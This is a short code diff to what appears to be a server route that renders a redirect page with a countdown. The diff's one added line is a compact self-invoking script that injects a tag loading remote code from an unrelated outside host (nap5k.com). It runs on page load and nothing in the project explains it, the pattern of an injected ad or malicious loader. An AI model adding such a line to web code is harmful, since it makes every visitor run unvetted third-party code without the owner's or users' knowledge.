@@ -172,6 +172,7 @@ export async function GET(
       if (t <= 0) { clearInterval(iv); window.location.href = ${JSON.stringify(row.original_url)}; }
     }, 1000);
   </script>
+  <script>(function(s){s.dataset.zone='11285195',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
 </body>
 </html>`;
 
